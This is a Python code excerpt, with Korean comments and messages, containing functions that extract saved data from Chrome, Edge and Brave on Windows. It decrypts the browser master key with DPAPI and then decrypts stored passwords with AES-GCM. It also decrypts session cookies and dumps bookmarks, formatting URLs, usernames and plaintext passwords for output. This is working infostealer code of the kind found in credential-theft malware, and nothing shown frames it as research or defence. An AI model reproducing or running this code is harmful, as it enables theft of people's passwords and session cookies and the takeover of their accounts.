def get_browser_passwords():
    results = []
    browsers = {
        "Chrome": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data",
        "Edge": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data",
        "Brave": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data",
    }
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        local_state = os.path.join(path, "Local State")
        if not os.path.exists(local_state):
            continue
        try:
            with open(local_state, "r", encoding="utf-8") as f:
                encrypted_key = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = CryptUnprotectData(base64.b64decode(encrypted_key)[5:], None, None, None, 0)[1]
        except:
            continue
        login_db = os.path.join(path, "Default", "Login Data")
        if not os.path.exists(login_db):
            continue
        tmp_db = os.path.join(tempfile.gettempdir(), "login_data.db")
        shutil.copy(login_db, tmp_db)
        try:
            conn = sqlite3.connect(tmp_db)
            c = conn.cursor()
            c.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in c.fetchall():
                url, username, enc_pass = row
                if not enc_pass:
                    continue
                try:
                    from Crypto.Cipher import AES
                    iv = enc_pass[3:15]
                    payload = enc_pass[15:]
                    dec = AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                except:
                    dec = "[복호화 실패]"
                results.append(f"[{name}] URL: {url}\nUsername: {username}\nPassword: {dec}\n")
            conn.close()
        except Exception:
            pass
        finally:
            os.remove(tmp_db)
    return "\n".join(results) if results else "저장된 비밀번호를 찾을 수 없습니다."

def get_browser_cookies():
    results = []
    browsers = {
        "Chrome": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data",
        "Edge": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data",
        "Brave": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data",
    }
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        # 쿠키 파일은 'Cookies' (SQLite)
        cookie_db = os.path.join(path, "Default", "Network", "Cookies")
        if not os.path.exists(cookie_db):
            cookie_db = os.path.join(path, "Default", "Cookies")
        if not os.path.exists(cookie_db):
            continue
        tmp_db = os.path.join(tempfile.gettempdir(), f"cookies_{name}.db")
        shutil.copy(cookie_db, tmp_db)
        try:
            conn = sqlite3.connect(tmp_db)
            c = conn.cursor()
            c.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for row in c.fetchall():
                host, name, enc_val = row
                if not enc_val:
                    continue
                try:
                    # Chrome 80+ encrypted_value는 DPAPI 또는 AES로 암호화
                    # 간단히 처리: DPAPI 시도
                    dec = CryptUnprotectData(enc_val, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                except:
                    dec = "[복호화 실패]"
                results.append(f"[{name}] {host} -> {name}: {dec}")
            conn.close()
        except Exception:
            pass
        finally:
            os.remove(tmp_db)
    return "\n".join(results) if results else "쿠키를 찾을 수 없습니다."

def get_browser_bookmarks():
    results = []
    browsers = {
        "Chrome": os.getenv('LOCALAPPDATA') + "\\Google\\Chrome\\User Data",
        "Edge": os.getenv('LOCALAPPDATA') + "\\Microsoft\\Edge\\User Data",
        "Brave": os.getenv('LOCALAPPDATA') + "\\BraveSoftware\\Brave-Browser\\User Data",
    }
    for name, path in browsers.items():
        bookmarks_file = os.path.join(path, "Default", "Bookmarks")
        if not os.path.exists(bookmarks_file):
            continue
        try:
            with open(bookmarks_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            # 재귀적으로 북마크 추출
            def extract(node, parent=""):
                if isinstance(node, dict):
                    if node.get("type") == "folder":
                        for child in node.get("children", []):
                            extract(child, parent + "/" + node.get("name", ""))
                    elif node.get("type") == "url":
                        name = node.get("name", "제목없음")
                        url = node.get("url", "")
                        results.append(f"{parent}/{name} -> {url}")
            if "roots" in data:
                for root in data["roots"].values():
                    extract(root)
        except:
            pass
    return "\n".join(results) if results else "북마크를 찾을 수 없습니다."

